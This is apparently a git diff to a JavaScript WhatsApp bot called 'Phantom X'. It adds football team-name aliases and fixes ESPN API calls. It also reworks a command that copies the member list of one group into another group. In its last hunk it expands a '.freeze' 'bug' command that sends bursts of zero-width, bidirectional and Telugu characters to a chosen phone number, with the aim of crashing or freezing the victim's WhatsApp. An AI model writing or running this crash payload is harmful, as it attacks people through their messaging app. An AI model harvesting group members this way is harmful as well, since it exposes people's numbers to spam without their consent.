@@ -681,20 +681,51 @@ async function getLiveScores() {
     return text;
 }
 
-async function getClubInfo(sock, from, teamName) {
-    const teamsData = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/teams?limit=50");
+
+// Common club name aliases so short names like "man utd", "spurs" etc work
+const TEAM_NAME_ALIASES = {
+    "man utd": "manchester united", "man u": "manchester united", "mufc": "manchester united", "united": "manchester united",
+    "man city": "manchester city", "city": "manchester city", "mcfc": "manchester city",
+    "spurs": "tottenham", "thfc": "tottenham", "hotspur": "tottenham",
+    "wolves": "wolverhampton", "wanderers": "wolverhampton",
+    "villa": "aston villa", "avfc": "aston villa",
+    "saints": "southampton",
+    "foxes": "leicester",
+    "gunners": "arsenal", "afc": "arsenal",
+    "reds": "liverpool", "lfc": "liverpool",
+    "blues": "chelsea", "cfc": "chelsea",
+    "toffees": "everton", "efc": "everton",
+    "hammers": "west ham", "whu": "west ham",
+    "magpies": "newcastle", "nufc": "newcastle",
+    "bees": "brentford",
+    "baggies": "west brom",
+    "cherries": "bournemouth",
+};
+
+function resolveTeamAlias(input) {
+    const lower = input.toLowerCase().trim();
+    return TEAM_NAME_ALIASES[lower] || lower;
+}
+
+async function findPLTeam(teamName) {
+    const search = resolveTeamAlias(teamName);
+    const teamsData = await fetchJSON("https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/teams");
     const teams = teamsData.sports?.[0]?.leagues?.[0]?.teams || [];
-    const team = teams.find(t => t.team.displayName.toLowerCase().includes(teamName.toLowerCase()) || t.team.shortDisplayName.toLowerCase().includes(teamName.toLowerCase()));
-    return team ? team.team : null;
+    return teams.find(t => {
+        const dn  = (t.team.displayName || "").toLowerCase();
+        const sdn = (t.team.shortDisplayName || "").toLowerCase();
+        const nn  = (t.team.nickname || "").toLowerCase();
+        const loc = (t.team.location || "").toLowerCase();
+        const abbr = (t.team.abbreviation || "").toLowerCase();
+        return dn.includes(search) || sdn.includes(search) || nn.includes(search) || loc.includes(search) || abbr === search;
+    }) || null;
 }
 
 async function getClubFixtures(teamName) {
-    const teamsData = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/teams?limit=50");
-    const teams = teamsData.sports?.[0]?.leagues?.[0]?.teams || [];
-    const team = teams.find(t => t.team.displayName.toLowerCase().includes(teamName.toLowerCase()) || t.team.shortDisplayName.toLowerCase().includes(teamName.toLowerCase()));
+    const team = await findPLTeam(teamName);
     if (!team) return null;
     const id = team.team.id;
-    const sched = await fetchJSON(`https://site.api.espn.com/apis/v2/sports/soccer/eng.1/teams/${id}/schedule`);
+    const sched = await fetchJSON(`https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/teams/${id}/schedule`);
     const events = sched.events || [];
     const upcoming = events.filter(e => e.competitions?.[0]?.status?.type?.state !== "post").slice(0, 5);
     const past = events.filter(e => e.competitions?.[0]?.status?.type?.state === "post").slice(-3);
@@ -801,12 +832,10 @@ const DARES = [
 ];
 
 async function getClubNews(teamName) {
-    const teamsData = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/teams?limit=50");
-    const teams = teamsData.sports?.[0]?.leagues?.[0]?.teams || [];
-    const team = teams.find(t => t.team.displayName.toLowerCase().includes(teamName.toLowerCase()) || t.team.shortDisplayName.toLowerCase().includes(teamName.toLowerCase()));
+    const team = await findPLTeam(teamName);
     if (!team) return null;
     const id = team.team.id;
-    const newsData = await fetchJSON(`https://site.api.espn.com/apis/v2/sports/soccer/eng.1/news?team=${id}&limit=5`);
+    const newsData = await fetchJSON(`https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/news?team=${id}&limit=5`);
     const articles = newsData.articles || [];
     if (!articles.length) return `No recent news found for ${team.team.displayName}.`;
     let text = `📰 *${team.team.displayName} — Latest News*\n━━━━━━━━━━━━━━━━━━━\n`;
@@ -2113,17 +2142,32 @@ _Can be started from any chat, but source members require source group access an
                     // Resolve source (link or group ID)
                     let sourceInfo, members;
                     if (sourceInput.endsWith("@g.us")) {
-                        sourceInfo = await sock.groupMetadata(sourceInput);
-                        members = sourceInfo.participants.map(p => p.id);
+                        try {
+                            sourceInfo = await sock.groupMetadata(sourceInput);
+                            members = (sourceInfo.participants || []).map(p => p.id);
+                        } catch (e) {
+                            return reply(`❌ Could not read source group.\n\nMake sure the linked WhatsApp number is a member of that group.\n\nReason: ${e?.message || "unknown"}`);
+                        }
                     } else {
-                        const sourceCode = sourceInput.split("chat.whatsapp.com/")[1]?.trim();
-                        if (!sourceCode) return reply("❌ Invalid source. Use a group link or group ID.");
-                        sourceInfo = await sock.groupGetInviteInfo(sourceCode);
-                        members = (sourceInfo.participants || []).map(p => p.id);
+                        const sourceCode = sourceInput.split("chat.whatsapp.com/")[1]?.split(/[?# ]/)[0]?.trim();
+                        if (!sourceCode) return reply("❌ Invalid source link. It must look like: https://chat.whatsapp.com/XXXX");
+                        let inviteInfo;
+                        try {
+                            inviteInfo = await sock.groupGetInviteInfo(sourceCode);
+                        } catch (e) {
+                            return reply(`❌ Could not read the source invite link.\n\nThe link may be expired or invalid.\n\nTip: Use the group ID instead — run *.groupid* inside the source group and use that.\n\nReason: ${e?.message || "unknown"}`);
+                        }
+                        // Try to get members from the group (only works if bot is already in it)
+                        try {
+                            sourceInfo = await sock.groupMetadata(inviteInfo.id);
+                            members = (sourceInfo.participants || []).map(p => p.id);
+                        } catch {
+                            return reply("❌ Got the group info but can't read its members.\n\nWhatsApp only shares the member list with accounts that are *already inside* the group.\n\n✅ Fix: Join the group with your linked number first, then use its Group ID (*.groupid* command) instead of the link.");
+                        }
                     }
 
                     if (!members.length) {
-                        return reply("❌ No members found in the source group.\n\nWhatsApp usually hides the participant list unless the linked account is already inside that source group. Use a source group ID where the bot/linked number is a member.");
+                        return reply("❌ No members found in the source group.\n\nThe linked WhatsApp account must be *inside* the source group to read its members. Use *.groupid* inside the group to get the ID, then try again.");
                     }
 
                     // Resolve destination (link or group ID)
@@ -2131,13 +2175,13 @@ _Can be started from any chat, but source members require source group access an
                     if (destInput.endsWith("@g.us")) {
                         destJid = destInput;
                     } else {
-                        const destCode = destInput.split("chat.whatsapp.com/")[1]?.trim();
-                        if (!destCode) return reply("❌ Invalid destination. Use a group link or group ID.");
+                        const destCode = destInput.split("chat.whatsapp.com/")[1]?.split(/[?# ]/)[0]?.trim();
+                        if (!destCode) return reply("❌ Invalid destination link. It must look like: https://chat.whatsapp.com/XXXX");
                         try {
                             const destInfo = await sock.groupGetInviteInfo(destCode);
                             destJid = destInfo.id;
-                        } catch {
-                            destJid = await sock.groupAcceptInvite(destCode);
+                        } catch (e) {
+                            return reply(`❌ Could not read the destination group link.\n\nThe link may be expired or invalid.\n\nReason: ${e?.message || "unknown"}`);
                         }
                     }
 
@@ -3444,20 +3488,45 @@ _Can be started from any chat, but source members require source group access an
             }
 
             // ─── FREEZE BUG ───
-            // Pure zero-width character flood — freezes the chat, can't scroll or type.
+            // Sends 3 burst payloads of zero-width + BiDi + Telugu chars.
+            // Effect: WhatsApp UI freezes/lags when the chat is opened.
+            // NOTE: This is a UI/rendering crash — it does NOT block network messages.
+            // The target cannot read the chat smoothly but can still send from other devices.
             case ".freeze": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
                 const freezeTarget = parseBugTarget(parts, msg);
-                if (!freezeTarget) return reply(`🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n_Freezes their chat — can't scroll or type._\n_Use .bugmenu freeze for full help._`);
+                if (!freezeTarget) return reply(
+                    `🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n` +
+                    `_What it does: Crashes & freezes their WhatsApp chat rendering._\n` +
+                    `_When they open the chat, WA lags/freezes and may force-close._\n` +
+                    `_Sends 3 burst payloads for maximum effect._\n\n` +
+                    `_Use .bugmenu freeze for full help._`
+                );
                 if (isDevProtected(freezeTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`🧊 Sending freeze bug to *${freezeTarget.split("@")[0]}*...`);
+                await reply(`🧊 Sending freeze burst to *${freezeTarget.split("@")[0]}*...`);
                 try {
-                    const zwSet = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f\u202a\u202b\u202c\u202d\u202e\u2061\u2062\u2063\u2064";
-                    const freezePayload = zwSet.repeat(1800);
-                    const freezeSent = await sock.sendMessage(freezeTarget, { text: freezePayload });
                     if (!userCrashKeys[freezeTarget]) userCrashKeys[freezeTarget] = [];
-                    userCrashKeys[freezeTarget].push(freezeSent.key);
-                    await reply(`✅ *Freeze sent to ${freezeTarget.split("@")[0]}!*\n\n🧊 Their chat is now frozen.\n🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`);
+                    const zw   = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f\u2061\u2062\u2063\u2064";
+                    const bidi = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";
+                    const tel  = "\u0C15\u0C4D\u0C37\u0C4D\u0C30";
+                    // Burst 1: pure zero-width flood
+                    const p1 = zw.repeat(2000);
+                    // Burst 2: BiDi + RTL stack
+                    const p2 = bidi.repeat(1200) + "\u202e".repeat(800) + zw.repeat(500);
+                    // Burst 3: combined — hardest for WA to render
+                    const p3 = zw.repeat(600) + tel.repeat(500) + bidi.repeat(600) + "\ufeff".repeat(800) + zw.repeat(600);
+                    for (const payload of [p1, p2, p3]) {
+                        const sent = await sock.sendMessage(freezeTarget, { text: payload });
+                        userCrashKeys[freezeTarget].push(sent.key);
+                        await delay(400);
+                    }
+                    await reply(
+                        `✅ *Freeze burst sent to ${freezeTarget.split("@")[0]}!*\n\n` +
+                        `🧊 3 payloads delivered.\n` +
+                        `📱 When they open the chat → WA rendering crashes/freezes.\n` +
+                        `⚠️ Note: They can still send msgs from other devices until WA crashes on theirs.\n` +
+                        `🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`
+                    );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
